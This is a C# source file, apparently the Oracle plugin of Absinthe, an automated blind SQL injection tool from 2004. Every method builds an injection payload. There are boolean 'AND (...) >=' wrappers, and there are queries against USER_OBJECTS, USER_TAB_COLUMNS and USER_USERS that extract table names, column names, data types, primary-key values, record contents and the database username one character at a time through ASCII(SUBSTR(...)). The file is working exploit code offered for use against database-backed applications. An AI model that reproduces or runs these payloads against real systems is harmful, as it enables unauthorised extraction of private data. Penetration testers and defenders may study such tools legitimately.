/*****************************************************************************
   Absinthe - The Automated Blind SQL Injection Tool
   This software is Copyright (C) 2004  Xeron, 0x90.org

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
******************************************************************************/

using System.Text;
using System.Data;

public class AbsinthePlugin : Absinthe.Core.PluginTemplate
{

	// {{{ AndEqualWrapper
	public override string AndEqualWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") = ");

		return retVal.ToString();
	}
	// }}}

	// {{{ AndGreaterThanEqualWrapper
	public override string AndGreaterThanEqualWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") >= ");

		return retVal.ToString();
	}
	// }}}

	// {{{ AndGreaterThanWrapper
	public override string AndGreaterThanWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") > ");

		return retVal.ToString();
	}
	// }}}

	// {{{ NextLowestTableID
	public override string NextLowestTableID(long PrevTableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select MIN(OBJECT_ID) from USER_OBJECTS where OBJECT_ID > ").Append(PrevTableID);
		retVal.Append(" AND OBJECT_TYPE=chr(84)||chr(65)||chr(66)||chr(76)||chr(69)");

		return retVal.ToString();
	}
	// }}}

	// {{{ TableNameLength
	public override string TableNameLength(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select LENGTH(OBJECT_NAME) from USER_OBJECTS where OBJECT_ID=").Append(TableID);
		retVal.Append(" AND OBJECT_TYPE=chr(84)||chr(65)||chr(66)||chr(76)||chr(69)");

		return retVal.ToString();
	}
	// }}}

	// {{{ TableNameCharacterValue
	public override string TableNameCharacterValue(long Index, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select ASCII(SUBSTR((OBJECT_NAME),").Append(Index).Append(",1)) from USER_OBJECTS where OBJECT_ID=");
		retVal.Append(TableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfRecords
	public override string NumberOfRecords(string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(*) FROM ").Append(TableName);

		return retVal.ToString();
	}
	// }}}

	// {{{ PrimaryKeyColumn
	public override string PrimaryKeyColumn(long TableID)
	{
		StringBuilder retVal = new StringBuilder();


		retVal.Append("select min(column_id) from user_ind_columns, user_objects, user_constraints, user_tab_columns");
		retVal.Append(" where user_objects.object_id=").Append(TableID);
		retVal.Append(" and user_constraints.table_name = user_ind_columns.table_name and user_constraints.constraint_name = user_objects.object_name");
		retVal.Append(" and user_constraints.constraint_type = 'P' and user_ind_columns.column_name = user_tab_columns.column_name");

		
		//retVal.Append("SELECT MIN(COLUMN_ID) FROM sysconstraints WHERE id=").Append(TableID).Append(" AND status=1");

		return retVal.ToString();
	}
	// }}}

	// {{{ FieldDataType
	public override string FieldDataType(long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		//retVal.Append("SELECT TOP 1 (xtype) FROM syscolumns WHERE id=").Append(TableID).Append(" AND colid=").Append(FieldID);
		//retVal.Append("SELECT DATA_TYPE FROM USER_TAB_COLUMNS WHERE ROWNUM=1 COLUMN_ID=").Append(FieldID).Append(" AND TABLE_NAME=").Append(TableID);
		retVal.Append("SELECT mod(to_number(replace(substr(dump(data_type), instr(dump(data_type), chr(58))+1), chr(44), chr(48))), 255)-decode(data_scale, 0, 0, null, 0, 1)");
		retVal.Append(" FROM USER_TAB_COLUMNS, ALL_OBJECTS WHERE COLUMN_ID=");
		retVal.Append(FieldID).Append(" AND OBJECT_ID=").Append(TableID).Append(" AND OBJECT_NAME = TABLE_NAME");
		
		

		return retVal.ToString();
	}
	// }}}

	// {{{ FieldNameLength
	public override string FieldNameLength(long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		//retVal.Append("SELECT TOP 1 LEN(name) FROM syscolumns WHERE id=").Append(TableID).Append(" AND colid=").Append(FieldID);
		//retVal.Append("SELECT LENGTH(COLUMN_NAME) FROM USER_TAB_COLUMNS WHERE ROWNUM=1 AND COLUMN_ID=").Append(FieldID).Append(" AND TABLE_NAME=").Append(TableID);
		
		retVal.Append("select length(column_name) from user_tab_columns, user_objects WHERE rownum = 1 AND user_tab_columns.column_id=").Append(FieldID);
		retVal.Append(" and user_tab_columns.table_name = user_objects.object_name and user_objects.object_id=").Append(TableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NextLowestFieldID
	public override string NextLowestFieldID(long TableID, long PrevFieldID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(COLUMN_ID) FROM USER_TAB_COLUMNS, USER_OBJECTS WHERE COLUMN_ID > ").Append(PrevFieldID).Append(" AND OBJECT_ID=").Append(TableID).Append(" AND OBJECT_NAME=TABLE_NAME");
		return retVal.ToString();
	}
	// }}}

	// {{{ FieldNameCharacterValue
	public override string FieldNameCharacterValue(long Index, long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTR(COLUMN_NAME,").Append(Index).Append(",1)) FROM USER_TAB_COLUMNS, USER_OBJECTS where USER_OBJECTS.OBJECT_ID=").Append(TableID);
		retVal.Append(" AND USER_OBJECTS.OBJECT_NAME = USER_TAB_COLUMNS.TABLE_NAME AND USER_TAB_COLUMNS.COLUMN_ID=").Append(FieldID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfTables
	public override string NumberOfTables()
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(TABLE_NAME) FROM USER_TABLES");

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfFieldsInTable
	public override string NumberOfFieldsInTable(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(COLUMN_NAME) FROM USER_TAB_COLUMNS, USER_OBJECTS WHERE OBJECT_ID=").Append(TableID).Append(" AND USER_TAB_COLUMNS.TABLE_NAME = USER_OBJECTS.OBJECT_NAME");

		return retVal.ToString();
	}
	// }}}

	// {{{ LengthOfConvertedPrimaryKeyValue
	public override string LengthOfConvertedPrimaryKeyValue(string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT LENGTH(TO_CHAR(MIN(").Append(KeyName).Append("))) FROM ").Append(TableName);

		return retVal.ToString();
	}

	public override string LengthOfConvertedPrimaryKeyValue(string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(LengthOfConvertedPrimaryKeyValue(KeyName, TableName));
		retVal.Append(" WHERE ").Append(KeyName).Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ ConvertedPrimaryKeyValueCharacter
	public override string ConvertedPrimaryKeyValueCharacter(long Index, string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTR(TO_CHAR(").Append(KeyName).Append("),").Append(Index);
		retVal.Append(",1)) FROM ").Append(TableName);

		return retVal.ToString();
	}

	public override string ConvertedPrimaryKeyValueCharacter(long Index, string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(ConvertedPrimaryKeyValueCharacter(Index, KeyName, TableName)).Append(" WHERE ");
		retVal.Append(KeyName).Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ ConcatenationCharacter
	public override string ConcatenationCharacter
	{
		get
		{
			return "||";
		}
	}
	// }}}

	// {{{ CharConversionFunction
	public override string CharConversionFunction(long DecimalValue)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("to_char(").Append(DecimalValue).Append(")");
		return retVal.ToString();
	}
	// }}}

	// {{{ IntegerPrimaryKeyValue
	public override string IntegerPrimaryKeyValue(string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(").Append(KeyName).Append(") FROM ").Append(TableName);
		return retVal.ToString();
	}

	public override string IntegerPrimaryKeyValue(string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(IntegerPrimaryKeyValue(KeyName, TableName)).Append(" WHERE ").Append(KeyName);
		retVal.Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ AndIsNullWrapper
	public override string AndIsNullWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(" AND (").Append(Value).Append(") IS NULL ");
		return retVal.ToString();
	}
	// }}}

	// {{{ SelectValueForGivenPrimaryKey
	public override string SelectValueForGivenPrimaryKey(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("SELECT ").Append(FieldName).Append(" FROM ").Append(TableName);
		retVal.Append(" WHERE ROWNUM=1 AND ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectLengthOfValueForGivenPrimaryKey
	public override string SelectLengthOfValueForGivenPrimaryKey(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("SELECT LENGTH(").Append(FieldName).Append(") FROM ").Append(TableName);
		retVal.Append(" WHERE ROWNUM=1 AND ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectCharacterValueForGivenPrimaryKey
	public override string SelectCharacterValueForGivenPrimaryKey(long Index, string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTR(TO_CHAR(").Append(FieldName).Append("),").Append(Index).Append(",1)) FROM ");
		retVal.Append(TableName).Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectLengthOfConvertedRecordValue
	public override string SelectLengthOfConvertedRecordValue(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT LENGTH(TO_CHAR(").Append(FieldName).Append(")) FROM ").Append(TableName);
		retVal.Append(" WHERE ROWNUM=1 AND ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectCharacterValueForConvertedRecordValue
	public override string SelectCharacterValueForConvertedRecordValue(long Index, string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTR(TO_CHAR(").Append(FieldName).Append("),").Append(Index);
		retVal.Append(",1)) FROM ").Append(TableName).Append(" WHERE ").Append(pk.Name).Append(" = ").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectDatabaseUsernameLength
	public override string SelectDatabaseUsernameLength()
	{
		return "SELECT LENGTH(a.username) from USER_USERS a where a.username=user";
	}
	// }}}

	// {{{ SelectCharacterFromDatabaseUsername
	public override string SelectCharacterFromDatabaseUsername(long Index)
	{
		StringBuilder retVal = new StringBuilder();

		
		retVal.Append("SELECT ASCII(SUBSTR(a.username,").Append(Index);
		retVal.Append(",1)) FROM USER_USERS a WHERE A.USERNAME = user");
		
		return retVal.ToString();
	}
	// }}}

	// {{{ PluginDisplayTargetName
	public override string PluginDisplayTargetName
	{
		get
		{
			return "Oracle RDBMS";
		}
	}
	// }}}
	
	// {{{ AuthorName
	public override string AuthorName
	{
		get
		{
			return "Xeron";
		}
	}
	// }}}

	// {{{ ConvertNativeDataType 
	/* Oracle DataTypes:
		CHAR, NCHAR, VARCHAR2 and NVARCHAR2
		NUMBER and FLOAT
		DATE and TIMESTAMP
		LONG, RAW and LONG RAW
		BLOB, CLOB, NCLOB and BFILE
		ROWID and UROWID		
	*/
		
	public override SqlDbType ConvertNativeDataType(long DataType)
	{
			switch (DataType)
			{
				case 52:
					return SqlDbType.Char;
				case 79:
					return SqlDbType.DateTime;
				case 81:
					return SqlDbType.VarChar;
				case 87:
					return SqlDbType.Variant;
				case 97:
					return SqlDbType.NText;
				case 118: // UNDEFINED
					return SqlDbType.Variant;
				case 125:
					return SqlDbType.VarChar;
				case 126: // NCLOB
					return SqlDbType.Variant;
				case 141:
					return SqlDbType.Float;
				case 142:				
					return SqlDbType.Int;
				case 143: // ROWID
					return SqlDbType.Variant;
				case 196:
					return SqlDbType.BigInt;
				case 200:
					return SqlDbType.NVarChar;
				case 222:
					return SqlDbType.Variant;
			}

			return SqlDbType.Variant;
	}
	// }}}
}
